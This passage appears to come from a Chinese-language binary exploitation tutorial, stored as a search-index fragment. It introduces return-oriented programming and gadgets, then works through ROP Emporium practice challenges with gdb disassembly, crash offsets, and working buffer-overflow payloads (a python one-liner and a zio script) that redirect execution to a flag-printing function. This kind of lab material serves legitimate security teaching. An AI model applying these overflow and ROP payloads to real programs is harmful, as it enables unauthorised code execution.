\u7b80\u4ecb","text":"<p>\u8fd4\u56de\u5bfc\u5411\u7f16\u7a0b\uff08Return-Oriented Programming\uff0c\u7f29\u5199\uff1aROP\uff09\u662f\u4e00\u79cd\u9ad8\u7ea7\u7684\u5185\u5b58\u653b\u51fb\u6280\u672f\uff0c\u8be5\u6280\u672f\u5141\u8bb8\u653b\u51fb\u8005\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u7684\u5404\u79cd\u901a\u7528\u9632\u5fa1\u4e0b\u6267\u884c\u4ee3\u7801\uff0c\u5982\u5185\u5b58\u4e0d\u53ef\u6267\u884c\u548c\u4ee3\u7801\u7b7e\u540d\u7b49\u3002\u8fd9\u7c7b\u653b\u51fb\u5f80\u5f80\u5229\u7528\u64cd\u4f5c\u5806\u6808\u8c03\u7528\u65f6\u7684\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u901a\u5e38\u662f\u7f13\u51b2\u533a\u6ea2\u51fa\u3002\u653b\u51fb\u8005\u63a7\u5236\u5806\u6808\u8c03\u7528\u4ee5\u52ab\u6301\u7a0b\u5e8f\u63a7\u5236\u6d41\u5e76\u6267\u884c\u9488\u5bf9\u6027\u7684\u673a\u5668\u8bed\u8a00\u6307\u4ee4\u5e8f\u5217\uff08gadgets\uff09\uff0c\u6bcf\u4e00\u6bb5 gadget \u901a\u5e38\u4ee5 return \u6307\u4ee4\uff08<code>ret</code>\uff0c\u673a\u5668\u7801\u4e3a<code>c3</code>\uff09\u7ed3\u675f\uff0c\u5e76\u4f4d\u4e8e\u5171\u4eab\u5e93\u4ee3\u7801\u4e2d\u7684\u5b50\u7a0b\u5e8f\u4e2d\u3002\u901a\u8fc7\u6267\u884c\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u4e5f\u5c31\u63a7\u5236\u4e86\u7a0b\u5e8f\u7684\u6267\u884c\u3002</p> <p><code>ret</code> \u6307\u4ee4\u76f8\u5f53\u4e8e <code>pop eip</code>\u3002\u5373\uff0c\u9996\u5148\u5c06 <code>esp</code> \u6307\u5411\u7684 4 \u5b57\u8282\u5185\u5bb9\u8bfb\u53d6\u5e76\u8d4b\u503c\u7ed9 <code>eip</code>\uff0c\u7136\u540e <code>esp</code> \u52a0\u4e0a 4 \u5b57\u8282\u6307\u5411\u6808\u7684\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u3002\u5982\u679c\u5f53\u524d\u6267\u884c\u7684\u6307\u4ee4\u5e8f\u5217\u4ecd\u7136\u4ee5 <code>ret</code> \u6307\u4ee4\u7ed3\u675f\uff0c\u5219\u8fd9\u4e2a\u8fc7\u7a0b\u5c06\u91cd\u590d\uff0c <code>esp</code> \u518d\u6b21\u589e\u52a0\u5e76\u4e14\u6267\u884c\u4e0b\u4e00\u4e2a\u6307\u4ee4\u5e8f\u5217\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#gadgets","title":"\u5bfb\u627e gadgets","text":"<ol> <li>\u5728\u7a0b\u5e8f\u4e2d\u5bfb\u627e\u6240\u6709\u7684 c3\uff08ret\uff09 \u5b57\u8282</li> <li>\u5411\u524d\u641c\u7d22\uff0c\u770b\u524d\u9762\u7684\u5b57\u8282\u662f\u5426\u5305\u542b\u4e00\u4e2a\u6709\u6548\u6307\u4ee4\uff0c\u8fd9\u91cc\u53ef\u4ee5\u6307\u5b9a\u6700\u5927\u641c\u7d22\u5b57\u8282\u6570\uff0c\u4ee5\u83b7\u5f97\u4e0d\u540c\u957f\u5ea6\u7684 gadgets</li> <li>\u8bb0\u5f55\u4e0b\u6211\u4eec\u627e\u5230\u7684\u6240\u6709\u6709\u6548\u6307\u4ee4\u5e8f\u5217</li> </ol> <p>\u7406\u8bba\u4e0a\u6211\u4eec\u662f\u53ef\u4ee5\u8fd9\u6837\u5bfb\u627e gadgets \u7684\uff0c\u4f46\u5b9e\u9645\u4e0a\u6709\u5f88\u591a\u5de5\u5177\u53ef\u4ee5\u5b8c\u6210\u8fd9\u4e2a\u5de5\u4f5c\uff0c\u5982 ROPgadget\uff0cRopper \u7b49\u3002\u66f4\u5b8c\u6574\u7684\u641c\u7d22\u53ef\u4ee5\u4f7f\u7528 http://ropshell.com/\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#gadgets_1","title":"\u5e38\u7528\u7684 gadgets","text":"<p>\u5bf9\u4e8e gadgets \u80fd\u505a\u7684\u4e8b\u60c5\uff0c\u57fa\u672c\u4e0a\u53ea\u8981\u4f60\u6562\u60f3\uff0c\u5b83\u5c31\u6562\u6267\u884c\u3002\u4e0b\u9762\u7b80\u5355\u4ecb\u7ecd\u51e0\u79cd\u7528\u6cd5\uff1a</p> <ul> <li>\u4fdd\u5b58\u6808\u6570\u636e\u5230\u5bc4\u5b58\u5668</li> <li>\u5c06\u6808\u9876\u7684\u6570\u636e\u629b\u51fa\u5e76\u4fdd\u5b58\u5230\u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u65b0\u7684\u6808\u9876\u5730\u5740\u3002\u6240\u4ee5\u5f53\u8fd4\u56de\u5730\u5740\u88ab\u4e00\u4e2a gadgets \u7684\u5730\u5740\u8986\u76d6\uff0c\u7a0b\u5e8f\u5c06\u5728\u8fd4\u56de\u540e\u6267\u884c\u8be5\u6307\u4ee4\u5e8f\u5217\u3002</li> <li>\u5982\uff1a<code>pop eax; ret</code></li> <li>\u4fdd\u5b58\u5185\u5b58\u6570\u636e\u5230\u5bc4\u5b58\u5668</li> <li>\u5c06\u5185\u5b58\u5730\u5740\u5904\u7684\u6570\u636e\u52a0\u8f7d\u5230\u5185\u5b58\u5668\u4e2d\u3002</li> <li>\u5982\uff1a<code>mov ecx,[eax]; ret</code></li> <li>\u4fdd\u5b58\u5bc4\u5b58\u5668\u6570\u636e\u5230\u5185\u5b58</li> <li>\u5c06\u5bc4\u5b58\u5668\u7684\u503c\u4fdd\u5b58\u5230\u5185\u5b58\u5730\u5740\u5904\u3002</li> <li>\u5982\uff1a<code>mov [eax],ecx; ret</code></li> <li>\u7b97\u6570\u548c\u903b\u8f91\u8fd0\u7b97</li> <li>add, sub, mul, xor \u7b49\u3002</li> <li>\u5982\uff1a<code>add eax,ebx; ret</code>, <code>xor edx,edx; ret</code></li> <li>\u7cfb\u7edf\u8c03\u7528</li> <li>\u6267\u884c\u5185\u6838\u4e2d\u65ad</li> <li>\u5982\uff1a<code>int 0x80; ret</code>, <code>call gs:[0x10]; ret</code></li> <li>\u4f1a\u5f71\u54cd\u6808\u5e27\u7684 gadgets</li> <li>\u8fd9\u4e9b gadgets \u4f1a\u6539\u53d8 ebp \u7684\u503c\uff0c\u4ece\u800c\u5f71\u54cd\u6808\u5e27\uff0c\u5728\u4e00\u4e9b\u64cd\u4f5c\u5982 stack pivot \u65f6\u6211\u4eec\u9700\u8981\u8fd9\u6837\u7684\u6307\u4ee4\u6765\u8f6c\u79fb\u6808\u5e27\u3002</li> <li>\u5982\uff1a<code>leave; ret</code>, <code>pop ebp; ret</code></li> </ul>"},{"location":"Training/Material/Binary%20Exploitation/#rop-emporium","title":"ROP Emporium","text":"<p>ROP Emporium \u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7528\u4e8e\u5b66\u4e60 ROP \u7684\u6311\u6218\uff0c\u6bcf\u4e00\u4e2a\u6311\u6218\u90fd\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u77e5\u8bc6\uff0c\u96be\u5ea6\u4e5f\u9010\u6e10\u589e\u52a0\uff0c\u662f\u5faa\u5e8f\u6e10\u8fdb\u5b66\u4e60 ROP \u7684\u597d\u8d44\u6599\u3002ROP Emporium \u8fd8\u6709\u4e2a\u7279\u70b9\u662f\u5b83\u4e13\u6ce8\u4e8e ROP\uff0c\u6240\u6709\u6311\u6218\u90fd\u6709\u76f8\u540c\u7684\u6f0f\u6d1e\u70b9\uff0c\u4e0d\u540c\u7684\u53ea\u662f ROP \u94fe\u6784\u9020\u7684\u4e0d\u540c\uff0c\u6240\u4ee5\u4e0d\u6d89\u53ca\u5176\u4ed6\u7684\u6f0f\u6d1e\u5229\u7528\u548c\u9006\u5411\u7684\u5185\u5bb9\u3002\u6bcf\u4e2a\u6311\u6218\u90fd\u5305\u542b\u4e86 32 \u4f4d\u548c 64 \u4f4d\u7684\u7a0b\u5e8f\uff0c\u901a\u8fc7\u5bf9\u6bd4\u80fd\u5e2e\u52a9\u6211\u4eec\u7406\u89e3 ROP \u94fe\u5728\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e0b\u7684\u5dee\u5f02\uff0c\u4f8b\u5982\u53c2\u6570\u7684\u4f20\u9012\u7b49\u3002\u8fd9\u7bc7\u6587\u7ae0\u6211\u4eec\u5c31\u4ece\u8fd9\u4e9b\u6311\u6218\u4e2d\u6765\u5b66\u4e60\u5427\u3002</p> <p>\u8fd9\u4e9b\u6311\u6218\u90fd\u5305\u542b\u4e00\u4e2a <code>flag.txt</code> \u7684\u6587\u4ef6\uff0c\u6211\u4eec\u7684\u76ee\u6807\u5c31\u662f\u901a\u8fc7\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\uff0c\u6765\u6253\u5370\u51fa\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u3002\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u83b7\u5f97 shell\u3002</p> <p>\u4e0b\u8f7d\u6587\u4ef6</p>"},{"location":"Training/Material/Binary%20Exploitation/#ret2win32","title":"ret2win32","text":"<p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6709\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u7a0b\u5e8f\uff0c\u6211\u4eec\u901a\u5e38\u5148\u8f93\u5165\u4e00\u5b9a\u6570\u91cf\u7684\u5b57\u7b26\u586b\u6ee1\u7f13\u51b2\u533a\uff0c\u7136\u540e\u662f\u7cbe\u5fc3\u6784\u9020\u7684 ROP \u94fe\uff0c\u901a\u8fc7\u8986\u76d6\u5806\u6808\u4e0a\u4fdd\u5b58\u7684\u8fd4\u56de\u5730\u5740\u6765\u5b9e\u73b0\u51fd\u6570\u8df3\u8f6c\uff08\u5173\u4e8e\u7f13\u51b2\u533a\u6ea2\u51fa\u8bf7\u67e5\u770b\u4e0a\u4e00\u7ae0 3.1.3\u6808\u6ea2\u51fa\uff09\u3002</p> <p>\u7b2c\u4e00\u4e2a\u6311\u6218\u6211\u4f1a\u5c3d\u91cf\u8be6\u7ec6\u4e00\u70b9\uff0c\u56e0\u4e3a\u6240\u6709\u6311\u6218\u7a0b\u5e8f\u90fd\u6709\u76f8\u4f3c\u7684\u7ed3\u6784\uff0c\u7f13\u51b2\u533a\u5927\u5c0f\u90fd\u4e00\u6837\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u6f0f\u6d1e\u51fd\u6570\uff1a</p> <pre><code>gdb-peda$ disassemble pwnme\nDump of assembler code for function pwnme:\n   0x080485f6 &lt;+0&gt;:     push   ebp\n   0x080485f7 &lt;+1&gt;:     mov    ebp,esp\n   0x080485f9 &lt;+3&gt;:     sub    esp,0x28\n   0x080485fc &lt;+6&gt;:     sub    esp,0x4\n   0x080485ff &lt;+9&gt;:     push   0x20\n   0x08048601 &lt;+11&gt;:    push   0x0\n   0x08048603 &lt;+13&gt;:    lea    eax,[ebp-0x28]\n   0x08048606 &lt;+16&gt;:    push   eax\n   0x08048607 &lt;+17&gt;:    call   0x8048460 &lt;memset@plt&gt;\n   0x0804860c &lt;+22&gt;:    add    esp,0x10\n   0x0804860f &lt;+25&gt;:    sub    esp,0xc\n   0x08048612 &lt;+28&gt;:    push   0x804873c\n   0x08048617 &lt;+33&gt;:    call   0x8048420 &lt;puts@plt&gt;\n   0x0804861c &lt;+38&gt;:    add    esp,0x10\n   0x0804861f &lt;+41&gt;:    sub    esp,0xc\n   0x08048622 &lt;+44&gt;:    push   0x80487bc\n   0x08048627 &lt;+49&gt;:    call   0x8048420 &lt;puts@plt&gt;\n   0x0804862c &lt;+54&gt;:    add    esp,0x10\n   0x0804862f &lt;+57&gt;:    sub    esp,0xc\n   0x08048632 &lt;+60&gt;:    push   0x8048821\n   0x08048637 &lt;+65&gt;:    call   0x8048400 &lt;printf@plt&gt;\n   0x0804863c &lt;+70&gt;:    add    esp,0x10\n   0x0804863f &lt;+73&gt;:    mov    eax,ds:0x804a060\n   0x08048644 &lt;+78&gt;:    sub    esp,0x4\n   0x08048647 &lt;+81&gt;:    push   eax\n   0x08048648 &lt;+82&gt;:    push   0x32\n   0x0804864a &lt;+84&gt;:    lea    eax,[ebp-0x28]\n   0x0804864d &lt;+87&gt;:    push   eax\n   0x0804864e &lt;+88&gt;:    call   0x8048410 &lt;fgets@plt&gt;\n   0x08048653 &lt;+93&gt;:    add    esp,0x10\n   0x08048656 &lt;+96&gt;:    nop\n   0x08048657 &lt;+97&gt;:    leave  \n   0x08048658 &lt;+98&gt;:    ret\nEnd of assembler dump.\ngdb-peda$ disassemble ret2win\nDump of assembler code for function ret2win:\n   0x08048659 &lt;+0&gt;:     push   ebp\n   0x0804865a &lt;+1&gt;:     mov    ebp,esp\n   0x0804865c &lt;+3&gt;:     sub    esp,0x8\n   0x0804865f &lt;+6&gt;:     sub    esp,0xc\n   0x08048662 &lt;+9&gt;:     push   0x8048824\n   0x08048667 &lt;+14&gt;:    call   0x8048400 &lt;printf@plt&gt;\n   0x0804866c &lt;+19&gt;:    add    esp,0x10\n   0x0804866f &lt;+22&gt;:    sub    esp,0xc\n   0x08048672 &lt;+25&gt;:    push   0x8048841\n   0x08048677 &lt;+30&gt;:    call   0x8048430 &lt;system@plt&gt;\n   0x0804867c &lt;+35&gt;:    add    esp,0x10\n   0x0804867f &lt;+38&gt;:    nop\n   0x08048680 &lt;+39&gt;:    leave  \n   0x08048681 &lt;+40&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>\u51fd\u6570 <code>pwnme()</code> \u662f\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u51fd\u6570\uff0c\u5b83\u8c03\u7528 <code>fgets()</code> \u8bfb\u53d6\u4efb\u610f\u6570\u636e\uff0c\u4f46\u7f13\u51b2\u533a\u7684\u5927\u5c0f\u53ea\u6709 40 \u5b57\u8282\uff08<code>0x0804864a &lt;+84&gt;: lea eax,[ebp-0x28]</code>\uff0c0x28=40\uff09\uff0c\u5f53\u8f93\u5165\u5927\u4e8e 40 \u5b57\u8282\u7684\u6570\u636e\u65f6\uff0c\u5c31\u53ef\u4ee5\u8986\u76d6\u6389\u8c03\u7528\u51fd\u6570\u7684 ebp \u548c\u8fd4\u56de\u5730\u5740\uff1a</p> <pre><code>gdb-peda$ pattern_create 50\n'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'\ngdb-peda$ r\nStarting program: /home/firmy/Desktop/rop_emporium/ret2win32/ret2win32\nret2win by ROP Emporium\n32bits\n\nFor my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?\nYou there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n\n&gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5c0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\")\nEBX: 0x0\nECX: 0xffffd5c0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\")\nEDX: 0xf7f90860 --&gt; 0x0\nESI: 0xf7f8ee28 --&gt; 0x1d1d30\nEDI: 0x0\nEBP: 0x41304141 ('AA0A')\nESP: 0xffffd5f0 --&gt; 0xf7f80062 --&gt; 0x41000000 ('')\nEIP: 0x41414641 ('AFAA')\nEFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41414641\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd5f0 --&gt; 0xf7f80062 --&gt; 0x41000000 ('')\n0004| 0xffffd5f4 --&gt; 0xffffd610 --&gt; 0x1\n0008| 0xffffd5f8 --&gt; 0x0\n0012| 0xffffd5fc --&gt; 0xf7dd57c3 (&lt;__libc_start_main+243&gt;:       add    esp,0x10)\n0016| 0xffffd600 --&gt; 0xf7f8ee28 --&gt; 0x1d1d30\n0020| 0xffffd604 --&gt; 0xf7f8ee28 --&gt; 0x1d1d30\n0024| 0xffffd608 --&gt; 0x0\n0028| 0xffffd60c --&gt; 0xf7dd57c3 (&lt;__libc_start_main+243&gt;:       add    esp,0x10)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41414641 in ?? ()\ngdb-peda$ pattern_offset $ebp\n1093681473 found at offset: 40\ngdb-peda$ pattern_offset $eip\n1094796865 found at offset: 44\n</code></pre> <p>\u7f13\u51b2\u533a\u8ddd\u79bb ebp \u548c eip \u7684\u504f\u79fb\u5206\u522b\u4e3a 40 \u548c 44\uff0c\u8fd9\u5c31\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u5047\u8bbe\u3002</p> <p>\u901a\u8fc7\u67e5\u770b\u7a0b\u5e8f\u7684\u903b\u8f91\uff0c\u867d\u7136\u6211\u4eec\u77e5\u9053 .text \u6bb5\u4e2d\u5b58\u5728\u51fd\u6570 <code>ret2win()</code>\uff0c\u4f46\u5728\u7a0b\u5e8f\u6267\u884c\u4e2d\u5e76\u6ca1\u6709\u8c03\u7528\u5230\u5b83\uff0c\u6211\u4eec\u8981\u505a\u7684\u5c31\u662f\u7528\u8be5\u51fd\u6570\u7684\u5730\u5740\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u4f7f\u7a0b\u5e8f\u8df3\u8f6c\u5230\u8be5\u51fd\u6570\u4e2d\uff0c\u4ece\u800c\u6253\u5370\u51fa flag\uff0c\u6211\u4eec\u79f0\u8fd9\u4e00\u7c7b\u578b\u7684 ROP \u4e3a ret2text\u3002</p> <p>\u8fd8\u6709\u4e00\u4ef6\u91cd\u8981\u7684\u4e8b\u60c5\u662f checksec\uff1a</p> <pre><code>gdb-peda$ checksec\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n</code></pre> <p>\u8fd9\u91cc\u5f00\u542f\u4e86\u5173\u95ed\u4e86 PIE\uff0c\u6240\u4ee5 .text \u7684\u52a0\u8f7d\u5730\u5740\u662f\u4e0d\u53d8\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 <code>ret2win()</code> \u7684\u5730\u5740 <code>0x08048659</code>\u3002</p> <p>payload \u5982\u4e0b\uff08\u6ce8\u8fd9\u7bc7\u6587\u7ae0\u4e2d\u7684paylaod\u6211\u4f1a\u4f7f\u7528\u591a\u79cd\u65b9\u6cd5\u6765\u5199\uff0c\u4ee5\u5c55\u793a\u5404\u79cd\u5de5\u5177\u7684\u4f7f\u7528\uff09\uff1a</p> <pre><code>$ python2 -c \"print 'A'*44 + '\\x59\\x86\\x04\\x08'\" | ./ret2win32\n...\n&gt; Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#ret2win","title":"ret2win","text":"<p>\u73b0\u5728\u662f 64 \u4f4d\u7a0b\u5e8f\uff1a</p> <pre><code>gdb-peda$ disassemble pwnme\nDump of assembler code for function pwnme:\n   0x00000000004007b5 &lt;+0&gt;:     push   rbp\n   0x00000000004007b6 &lt;+1&gt;:     mov    rbp,rsp\n   0x00000000004007b9 &lt;+4&gt;:     sub    rsp,0x20\n   0x00000000004007bd &lt;+8&gt;:     lea    rax,[rbp-0x20]\n   0x00000000004007c1 &lt;+12&gt;:    mov    edx,0x20\n   0x00000000004007c6 &lt;+17&gt;:    mov    esi,0x0\n   0x00000000004007cb &lt;+22&gt;:    mov    rdi,rax\n   0x00000000004007ce &lt;+25&gt;:    call   0x400600 &lt;memset@plt&gt;\n   0x00000000004007d3 &lt;+30&gt;:    mov    edi,0x4008f8\n   0x00000000004007d8 &lt;+35&gt;:    call   0x4005d0 &lt;puts@plt&gt;\n   0x00000000004007dd &lt;+40&gt;:    mov    edi,0x400978\n   0x00000000004007e2 &lt;+45&gt;:    call   0x4005d0 &lt;puts@plt&gt;\n   0x00000000004007e7 &lt;+50&gt;:    mov    edi,0x4009dd\n   0x00000000004007ec &lt;+55&gt;:    mov    eax,0x0\n   0x00000000004007f1 &lt;+60&gt;:    call   0x4005f0 &lt;printf@plt&gt;\n   0x00000000004007f6 &lt;+65&gt;:    mov    rdx,QWORD PTR [rip+0x200873]        # 0x601070 &lt;stdin@@GLIBC_2.2.5&gt;\n   0x00000000004007fd &lt;+72&gt;:    lea    rax,[rbp-0x20]\n   0x0000000000400801 &lt;+76&gt;:    mov    esi,0x32\n   0x0000000000400806 &lt;+81&gt;:    mov    rdi,rax\n   0x0000000000400809 &lt;+84&gt;:    call   0x400620 &lt;fgets@plt&gt;\n   0x000000000040080e &lt;+89&gt;:    nop\n   0x000000000040080f &lt;+90&gt;:    leave  \n   0x0000000000400810 &lt;+91&gt;:    ret\nEnd of assembler dump.\ngdb-peda$ disassemble ret2win\nDump of assembler code for function ret2win:\n   0x0000000000400811 &lt;+0&gt;:     push   rbp\n   0x0000000000400812 &lt;+1&gt;:     mov    rbp,rsp\n   0x0000000000400815 &lt;+4&gt;:     mov    edi,0x4009e0\n   0x000000000040081a &lt;+9&gt;:     mov    eax,0x0\n   0x000000000040081f &lt;+14&gt;:    call   0x4005f0 &lt;printf@plt&gt;\n   0x0000000000400824 &lt;+19&gt;:    mov    edi,0x4009fd\n   0x0000000000400829 &lt;+24&gt;:    call   0x4005e0 &lt;system@plt&gt;\n   0x000000000040082e &lt;+29&gt;:    nop\n   0x000000000040082f &lt;+30&gt;:    pop    rbp\n   0x0000000000400830 &lt;+31&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>\u9996\u5148\u4e0e 32 \u4f4d\u4e0d\u540c\u7684\u662f\u53c2\u6570\u4f20\u9012\uff0c64 \u4f4d\u7a0b\u5e8f\u7684\u524d\u516d\u4e2a\u53c2\u6570\u901a\u8fc7 RDI\u3001RSI\u3001RDX\u3001RCX\u3001R8 \u548c R9 \u4f20\u9012\u3002\u6240\u4ee5\u7f13\u51b2\u533a\u5927\u5c0f\u53c2\u6570\u901a\u8fc7 rdi \u4f20\u9012\u7ed9 <code>fgets()</code>\uff0c\u5927\u5c0f\u4e3a 32 \u5b57\u8282\u3002</p> <p>\u800c\u4e14\u7531\u4e8e ret \u7684\u5730\u5740\u4e0d\u5b58\u5728\uff0c\u7a0b\u5e8f\u505c\u5728\u4e86 <code>=&gt; 0x400810 &lt;pwnme+91&gt;: ret</code> \u8fd9\u4e00\u6b65\uff0c\u8fd9\u662f\u56e0\u4e3a 64 \u4f4d\u53ef\u4ee5\u4f7f\u7528\u7684\u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e <code>0x00007fffffffffff</code>\uff0c\u5426\u5219\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\u3002</p> <pre><code>gdb-peda$ r\nStarting program: /home/firmy/Desktop/rop_emporium/ret2win/ret2win\nret2win by ROP Emporium\n64bits\n\nFor my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?\nYou there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n\n&gt; AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x7fffffffe400 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\")\nRBX: 0x0\nRCX: 0x1f\nRDX: 0x7ffff7dd4710 --&gt; 0x0\nRSI: 0x7fffffffe400 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\")\nRDI: 0x7fffffffe401 (\"AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\")\nRBP: 0x6141414541412941 ('A)AAEAAa')\nRSP: 0x7fffffffe428 (\"AA0AAFAAb\")\nRIP: 0x400810 (&lt;pwnme+91&gt;:      ret)\nR8 : 0x0\nR9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)\nR10: 0x602260 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\\n\")\nR11: 0x246\nR12: 0x400650 (&lt;_start&gt;:        xor    ebp,ebp)\nR13: 0x7fffffffe510 --&gt; 0x1\nR14: 0x0\nR15: 0x0\nEFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x400809 &lt;pwnme+84&gt;: call   0x400620 &lt;fgets@plt&gt;\n   0x40080e &lt;pwnme+89&gt;: nop\n   0x40080f &lt;pwnme+90&gt;: leave  \n=&gt; 0x400810 &lt;pwnme+91&gt;: ret\n   0x400811 &lt;ret2win&gt;:  push   rbp\n   0x400812 &lt;ret2win+1&gt;:        mov    rbp,rsp\n   0x400815 &lt;ret2win+4&gt;:        mov    edi,0x4009e0\n   0x40081a &lt;ret2win+9&gt;:        mov    eax,0x0\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffe428 (\"AA0AAFAAb\")\n0008| 0x7fffffffe430 --&gt; 0x400062 --&gt; 0x1f8000000000000\n0016| 0x7fffffffe438 --&gt; 0x7ffff7a41f6a (&lt;__libc_start_main+234&gt;:       mov    edi,eax)\n0024| 0x7fffffffe440 --&gt; 0x0\n0032| 0x7fffffffe448 --&gt; 0x7fffffffe518 --&gt; 0x7fffffffe870 (\"/home/firmy/Desktop/rop_emporium/ret2win/ret2win\")\n0040| 0x7fffffffe450 --&gt; 0x100000000\n0048| 0x7fffffffe458 --&gt; 0x400746 (&lt;main&gt;:      push   rbp)\n0056| 0x7fffffffe460 --&gt; 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x0000000000400810 in pwnme ()\ngdb-peda$ pattern_offset $rbp\n7007954260868540737 found at offset: 32\ngdb-peda$ pattern_offset AA0AAFAAb\nAA0AAFAAb found at offset: 40\n</code></pre> <p><code>re2win()</code> \u7684\u5730\u5740\u4e3a <code>0x0000000000400811</code>\uff0cpayload \u5982\u4e0b\uff1a</p> <pre><code>from zio import *\n\npayload = \"A\"*40 + l64(0x0000000000400811)\n\nio = zio('./ret2win')\nio.writeline(payload)\nio.read()\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#split32","title":"split32","text":"<p>\u8fd9\u4e00\u9898\u4e5f\u662f ret2text\uff0c\u4f46\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u6709\u7684\u662f\u4e00\u4e2a <code>usefulFunction()</code> \u51fd\u6570\uff1a</p> <pre><code>gdb-peda$ disassemble usefulFunction\nDump of assembler code for function usefulFunction:\n   0x08048649 &lt;+0&gt;:     push   ebp\n   0x0804864a &lt;+1&gt;:     mov    ebp,esp\n   0x0804864c &lt;+3&gt;:     sub    esp,0x8\n   0x0804864f &lt;+6&gt;:     sub    esp,0xc\n   0x08048652 &lt;+9&gt;:     push   0x8048747\n   0x08048657 &lt;+14&gt;:    call   0x8048430 &lt;system@plt&gt;\n   0x0804865c &lt;+19&gt;:    add    esp,0x10\n   0x0804865f &lt;+22&gt;:    nop\n   0x08048660 &lt;+23&gt;:    leave  \n   0x08048661 &lt;+24&gt;:    ret\nEnd of assembler dump.\n</code></pre> <p>\u5b83\u8c03\u7528 <code>system()</code> \u51fd\u6570\uff0c\u800c\u6211\u4eec\u8981\u505a\u7684\u662f\u7ed9\u5b83\u4f20\u9012\u4e00\u4e2a\u53c2\u6570\uff0c\u6267\u884c\u8be5\u53c2\u6570\u540e\u53ef\u4ee5\u6253\u5370\u51fa flag\u3002</p> <p>\u4f7f\u7528 radare2 \u4e2d\u7684\u5de5\u5177 rabin2 \u5728 <code>.data</code> \u6bb5\u4e2d\u641c\u7d22\u5b57\u7b26\u4e32\uff1a</p> <pre><code>$ rabin2 -z split32\n...\nvaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt\n</code></pre> <p>\u6211\u4eec\u53d1\u73b0\u5b58\u5728\u5b57\u7b26\u4e32 <code>/bin/cat flag.txt</code>\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684\uff0c\u5730\u5740\u4e3a <code>0x0804a030</code>\u3002</p> <p>\u4e0b\u9762\u6784\u9020 payload\uff0c\u8fd9\u91cc\u5c31\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u4f7f\u7528\u8c03\u7528 <code>system()</code> \u51fd\u6570\u7684\u5730\u5740 <code>0x08048657</code>\uff0c\u53e6\u4e00\u79cd\u662f\u4f7f\u7528 <code>system()</code> \u7684 plt \u5730\u5740 <code>0x8048430</code>\uff0c\u5728\u524d\u9762\u7684\u7ae0\u8282\u4e2d\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 plt 